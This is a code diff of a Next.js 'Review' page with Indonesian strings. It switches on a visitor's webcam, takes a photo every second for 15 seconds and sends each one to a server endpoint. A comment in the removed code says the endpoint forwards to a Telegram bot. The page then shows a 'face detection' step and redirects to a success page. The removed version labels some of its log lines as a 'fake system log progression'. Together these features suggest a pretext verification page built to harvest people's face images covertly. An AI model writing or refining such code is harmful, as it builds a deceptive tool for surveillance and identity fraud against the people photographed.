@@ -1,309 +1,227 @@
-import { useEffect, useRef, useState } from 'react';
-import { useRouter } from 'next/router';
+import { useRef, useState } from "react";
+import { useRouter } from "next/router";
 
 export default function Review() {
   const router = useRouter();
 
-  // logs state
-  const [logs, setLogs] = useState([]);
-  function pushLog(txt) {
-    const time = new Date().toLocaleTimeString();
-    setLogs(prev => [`${time} — ${txt}`, ...prev].slice(0, 300));
-  }
-
-  // camera refs & state
   const videoRef = useRef(null);
-  const canvasRef = useRef(null);
-  const captureIntervalRef = useRef(null);
-  const detectIntervalRef = useRef(null);
-  const [cameraAllowed, setCameraAllowed] = useState(false);
-  const [status, setStatus] = useState('idle'); // idle, loading, proses, deteksi, berhasil, gagal
-  const [seconds, setSeconds] = useState(0);
+  const canvas = useRef(null);
 
-  useEffect(() => {
-    return () => stopAll();
-  }, []);
+  const queue = useRef([]);
+  const sending = useRef(false);
 
-  function stopAll() {
-    if (captureIntervalRef.current) { clearInterval(captureIntervalRef.current); captureIntervalRef.current = null; }
-    if (detectIntervalRef.current) { clearInterval(detectIntervalRef.current); detectIntervalRef.current = null; }
-    const s = videoRef.current?.srcObject;
-    if (s && s.getTracks) s.getTracks().forEach(t => t.stop());
-    videoRef.current && (videoRef.current.srcObject = null);
+  const [logs, setLogs] = useState([]);
+  const [running, setRunning] = useState(false);
+  const [status, setStatus] = useState("idle");
+  const [attempt, setAttempt] = useState(0);
+
+  function log(msg) {
+    setLogs((p) => [...p, msg].slice(-200));
   }
 
-  async function requestCamera() {
-    setStatus('loading');
-    pushLog('requesting-camera-permission');
-    try {
-      const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' }, audio: false });
-      videoRef.current.srcObject = stream;
-      await videoRef.current.play();
-      setCameraAllowed(true);
-      setStatus('idle');
-      pushLog('camera-allowed');
-    } catch (e) {
-      console.error(e);
-      setCameraAllowed(false);
-      setStatus('gagal');
-      pushLog('camera-denied');
-    }
-  }
-
-  function captureFrameDataURL() {
-    const video = videoRef.current;
-    if (!video) return null;
-    if (!canvasRef.current) canvasRef.current = document.createElement('canvas');
-    const canvas = canvasRef.current;
-    const w = video.videoWidth || 640;
-    const h = video.videoHeight || 480;
-    canvas.width = w;
-    canvas.height = h;
-    const ctx = canvas.getContext('2d');
-    ctx.drawImage(video, 0, 0, w, h);
-    return canvas.toDataURL('image/jpeg', 0.8);
-  }
-
-  async function sendPhotoToServer(base64, filename, caption, extra = {}) {
-    try {
-      const res = await fetch('/api/laifulbotapi', {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({ action: 'sendPhoto', imageBase64: base64, filename, caption, extra })
-      });
-      return await res.json();
-    } catch (e) {
-      console.error(e);
-      return { ok: false, error: e.message || String(e) };
-    }
-  }
-
-  async function callFaceAnalyze(base64) {
-    try {
-      const res = await fetch('/api/laifulbotapi', {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({ action: 'faceAnalyze', imageBase64: base64 })
-      });
-      return await res.json();
-    } catch (e) {
-      console.error(e);
-      return { ok: false, error: e.message || String(e) };
-    }
-  }
-
-  function randId(len = 12) {
-    const chars = 'abcdefghijklmnopqrstuvwxyz0123456789';
-    let s = '';
-    for (let i = 0; i < len; i++) s += chars[Math.floor(Math.random() * chars.length)];
+  function makeID() {
+    const c = "abcdefghijklmnopqrstuvwxyz0123456789";
+    let s = "";
+    for (let i = 0; i < 24; i++) s += c[Math.floor(Math.random() * c.length)];
     return s;
   }
 
-  async function startAll() {
-    // ensure camera
-    if (!cameraAllowed) {
-      await requestCamera();
-      if (!cameraAllowed && !videoRef.current?.srcObject) {
-        pushLog('camera-not-available');
-        return;
-      }
+  async function requestCamera() {
+    try {
+      const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+      videoRef.current.srcObject = stream;
+      await videoRef.current.play();
+      return true;
+    } catch {
+      return false;
+    }
+  }
+
+  function push(base64, id) {
+    queue.current.push({ base64, id });
+    processSend();
+  }
+
+  async function processSend() {
+    if (sending.current) return;
+    if (!queue.current.length) return;
+
+    sending.current = true;
+
+    const { base64, id } = queue.current.shift();
+
+    const r = await fetch("/api/laifulbotapi", {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({ action: "send", imageBase64: base64, id })
+    }).then(r => r.json());
+
+    if (!r.ok) {
+      log(`id: ${id} (retry)`);
+      queue.current.push({ base64, id });
+    } else {
+      log(`id: ${id}`);
     }
 
-    setStatus('proses');
-    setSeconds(0);
-    pushLog('building-start');
+    sending.current = false;
+    processSend();
+  }
 
-    // capture every 1 second for 15s
-    let count = 0;
-    captureIntervalRef.current = setInterval(async () => {
-      count++;
-      setSeconds(prev => prev + 1);
+  function capture() {
+    if (!canvas.current) canvas.current = document.createElement("canvas");
+    const c = canvas.current;
+    const v = videoRef.current;
 
-      const dataUrl = captureFrameDataURL();
-      if (!dataUrl) {
-        pushLog('capture-failed-no-data');
-        return;
-      }
-      const base64 = dataUrl.replace(/^data:image\/(png|jpeg|jpg);base64,/, '');
-      const shortId = `terdeteksi-${randId(12)}`;
-      pushLog(`photo-captured ${shortId}`);
+    c.width = v.videoWidth;
+    c.height = v.videoHeight;
 
-      // send to Telegram via server
-      const r = await sendPhotoToServer(base64, `${shortId}.jpg`, shortId);
-      if (r?.ok) pushLog(`sent-to-bot ${shortId}`);
-      else pushLog(`send-failed ${r?.error || 'unknown'}`);
+    c.getContext("2d").drawImage(v, 0, 0);
 
-      // fake system log progression
-      if (count === 1) pushLog('module:loading');
-      if (count === 5) pushLog('module:proses');
-      if (count === 10) pushLog('module:proses-ongoing');
+    return c.toDataURL("image/jpeg", 0.8).replace(/^data:image\/jpeg;base64,/, "");
+  }
 
-      if (count >= 15) {
-        clearInterval(captureIntervalRef.current);
-        captureIntervalRef.current = null;
-        pushLog('capture-phase-complete');
-        // after capture phase, start detection cycle
-        startDetectionCycle();
+  async function startProcess() {
+    setLogs([]);
+    setAttempt(0);
+    setRunning(true);
+    setStatus("running");
+
+    const ok = await requestCamera();
+    if (!ok) {
+      log("kamera tidak diizinkan");
+      setRunning(false);
+      return;
+    }
+
+    let sec = 0;
+    const timer = setInterval(() => {
+      sec++;
+      const id = makeID();
+      log(`id: ${id}`);
+      push(capture(), id);
+
+      if (sec >= 15) {
+        clearInterval(timer);
+        detectPhase();
       }
     }, 1000);
   }
 
-  let detectAttempts = 0;
-  async function startDetectionCycle() {
-    setStatus('deteksi');
-    detectAttempts = 0;
-    pushLog('starting-face-detection-cycle');
+  async function detectPhase() {
+    const id = makeID();
+    log(`mendeteksi: ${id}`);
+    log("memeriksa...");
 
-    detectIntervalRef.current = setInterval(async () => {
-      detectAttempts++;
-      setSeconds(prev => prev + 1);
+    const base64 = capture();
 
-      const dataUrl = captureFrameDataURL();
-      if (!dataUrl) {
-        pushLog('detect-capture-failed');
-        return;
-      }
-      const base64 = dataUrl.replace(/^data:image\/(png|jpeg|jpg);base64,/, '');
+    const det = await fetch("/api/laifulbotapi", {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({
+        action: "detect",
+        imageBase64: base64,
+        id
+      })
+    }).then(r => r.json());
 
-      pushLog(`deteksi-attempt-${detectAttempts}`);
-      const analysis = await callFaceAnalyze(base64);
-      if (!analysis?.ok) {
-        pushLog(`face-api-error ${analysis?.error || JSON.stringify(analysis)}`);
-      } else {
-        // api4.ai returns nested structure. We check for faces in result
-        const faces = (analysis.result && (analysis.result?.results?.[0]?.entities || analysis.result?.results)) || analysis.result?.faces || [];
-        // try several access patterns
-        let faceCount = 0;
-        try {
-          // common api4.ai structure: result.results[0].entities[?].objects / faces
-          const r0 = analysis.result?.results?.[0];
-          if (r0 && Array.isArray(r0?.entities)) {
-            // attempt to find face-like entity with face metadata
-            for (const e of r0.entities) {
-              if ((e?.type || '').toLowerCase().includes('face') || e?.classes?.some?.(c => c.toLowerCase().includes('face'))) {
-                faceCount += 1;
-              }
-              if (Array.isArray(e?.objects)) faceCount += e.objects.length;
-            }
-          }
-        } catch (e) {
-          // ignore parsing error
-        }
+    let faces = 0;
+    try {
+      const r = det?.result?.results?.[0];
+      faces = (r?.entities || []).length;
+    } catch {}
 
-        // fallback: check known fields
-        if (!faceCount) {
-          if (Array.isArray(analysis.result?.faces)) faceCount = analysis.result.faces.length;
-          if (Array.isArray(analysis.faces)) faceCount = analysis.faces.length;
-        }
+    if (faces > 0) {
+      log("wajah ditemukan");
+      router.push("/success");
+      return;
+    }
 
-        pushLog(`face-api-raw-summary ${JSON.stringify(analysis.result?.results?.[0]?.summary || {}).slice(0,200)}`);
+    log("gagal mendeteksi");
 
-        if (faceCount > 0) {
-          pushLog('deteksi-berhasil');
-          // send detection image + summary to telegram
-          const sendRes = await sendPhotoToServer(base64, `deteksi-${Date.now()}.jpg`, `deteksi-berhasil-${randId(8)}`, { analysisSummary: analysis.result });
-          if (sendRes?.ok) pushLog('deteksi-sent-to-bot');
-          else pushLog('deteksi-send-failed');
+    if (attempt + 1 >= 3) {
+      log("coba lagi");
+      setRunning(false);
+      setStatus("idle");
+      return;
+    }
 
-          clearInterval(detectIntervalRef.current);
-          detectIntervalRef.current = null;
-          setStatus('berhasil');
-          pushLog('system-status:BERHASIL');
-          // route to success page
-          setTimeout(() => router.push('/success'), 700);
-          return;
-        } else {
-          pushLog(`deteksi-tidak-terlihat attempt:${detectAttempts}`);
-        }
-      }
-
-      if (detectAttempts >= 20) {
-        clearInterval(detectIntervalRef.current);
-        detectIntervalRef.current = null;
-        setStatus('gagal');
-        pushLog('system-status:GAGAL');
-      }
-
-    }, 1000);
+    setAttempt((x) => x + 1);
+    detectPhase();
   }
 
   return (
-    <main className="page">
+    <main className="wrap">
       <div className="container">
-        <div className="monitor">
-          <div className="videoWrap">
-            <video ref={videoRef} className="video" playsInline muted />
-            {!cameraAllowed && (
-              <div className="placeholder">Preview mati — klik "Minta Izin Kamera"</div>
+
+        <div className="left">
+          <div className="videoBox">
+            <video ref={videoRef} className="video" autoPlay muted playsInline />
+          </div>
+
+          <div className="controls">
+            {!running && (
+              <button className="btn" onClick={startProcess}>START</button>
             )}
-          </div>
-
-          <div className="system">
-            <div className="meta">
-              <div className="title">Sistem</div>
-              <div className="status">Status: <span className="badge">{status}</span></div>
-              <div className="timer">Waktu: {seconds}s</div>
-            </div>
-
-            <div className="controls">
-              <button className="btn" onClick={requestCamera}>Minta Izin Kamera</button>
-              <button className="btn" onClick={startAll}>Start</button>
-              <button className="btn ghost" onClick={() => { stopAll(); setStatus('idle'); pushLog('stopped'); }}>Stop</button>
-            </div>
+            {running && <div className="status">status: {status}</div>}
           </div>
         </div>
 
-        <div className="panel">
-          <div className="panelHead">
-            <div className="title">Log Info</div>
-            <div className="hint">Monitor aktivitas sistem & pengiriman ke bot</div>
-          </div>
-
-          <div className="logs">
-            {logs.length === 0 && <div className="logEmpty">Belum ada log</div>}
-            {logs.map((l, i) => <div key={i} className="logItem">{l}</div>)}
+        <div className="right">
+          <div className="logBox">
+            {logs.map((l, i) => <div key={i} className="log">{l}</div>)}
           </div>
         </div>
+
       </div>
 
       <style jsx>{`
-        :global(body){ margin:0; font-family:Inter,ui-sans-serif,system-ui,Segoe UI,Roboto,"Helvetica Neue",Arial; background:#0b1220; color:#e6eef8; }
-        .page { padding:18px; min-height:100vh; box-sizing:border-box; }
-        .container { display:flex; gap:18px; align-items:flex-start; max-width:1200px; margin:0 auto; }
-
-        /* monitor section */
-        .monitor { flex:1; display:flex; flex-direction:column; gap:12px; }
-        .videoWrap { width:100%; height:360px; background:#000; border-radius:10px; position:relative; overflow:hidden; display:flex; align-items:center; justify-content:center; }
-        .video { width:100%; height:100%; object-fit:cover; display:block; }
-        .placeholder { color:#94a3b8; position:absolute; text-align:center; padding:12px; }
-
-        .system { display:flex; justify-content:space-between; align-items:center; gap:12px; background:rgba(255,255,255,0.02); padding:12px; border-radius:8px; }
-        .meta { display:flex; gap:12px; align-items:center; }
-        .meta .title { font-weight:600; }
-        .badge { background:#072f2f; color:#8ff; padding:6px 10px; border-radius:999px; font-weight:600; margin-left:6px; }
-        .controls { display:flex; gap:8px; align-items:center; }
-
-        .btn { background:#06b6d4; color:#022; padding:8px 12px; border-radius:8px; border:0; cursor:pointer; font-weight:600; }
-        .btn.ghost { background:transparent; color:#94a3b8; border:1px solid rgba(255,255,255,0.04); }
-
-        /* panel/logs */
-        .panel { width:360px; max-width:40%; min-width:260px; background:rgba(255,255,255,0.02); padding:12px; border-radius:10px; display:flex; flex-direction:column; gap:12px; }
-        .panelHead { display:flex; justify-content:space-between; align-items:center; }
-        .logs { background:#071021; padding:12px; border-radius:8px; min-height:360px; max-height:68vh; overflow:auto; font-family:monospace; font-size:13px; color:#9ae6ff; }
-        .logItem { padding:6px 0; border-bottom:1px dashed rgba(255,255,255,0.02); }
-        .logEmpty { color:#94a3b8; }
-
-        /* responsive */
-        @media (max-width: 900px) {
-          .container { flex-direction:column; }
-          .panel { width:100%; max-width:100%; min-width:unset; }
-          .videoWrap { height:260px; }
+        .wrap {
+          min-height:100vh;
+          padding:16px;
+          background:#0b1220;
+          color:#e2e8f0;
         }
-
-        @media (max-width: 480px) {
-          .videoWrap { height:220px; }
-          .system { flex-direction:column; align-items:flex-start; gap:8px; }
-          .controls { width:100%; display:flex; justify-content:space-between; }
+        .container {
+          display:flex;
+          flex-wrap:wrap;
+          gap:16px;
+        }
+        .left { flex:1; min-width:260px; }
+        .videoBox {
+          height:300px;
+          background:#000;
+          border-radius:8px;
+          overflow:hidden;
+        }
+        .video { width:100%; height:100%; object-fit:cover; }
+        .controls { margin-top:12px; }
+        .btn {
+          padding:10px 16px;
+          background:#06b6d4;
+          border-radius:8px;
+          border:none;
+          font-weight:bold;
+          cursor:pointer;
+        }
+        .right {
+          width:340px;
+          flex-shrink:0;
+        }
+        .logBox {
+          background:#07101f;
+          height:420px;
+          overflow-y:auto;
+          padding:10px;
+          border-radius:8px;
+          font-family:monospace;
+          font-size:13px;
+        }
+        .log {
+          padding:4px 0;
+          border-bottom:1px dashed #1e293b;
+        }
+        @media (max-width:768px) {
+          .right { width:100%; }
         }
       `}</style>
     </main>
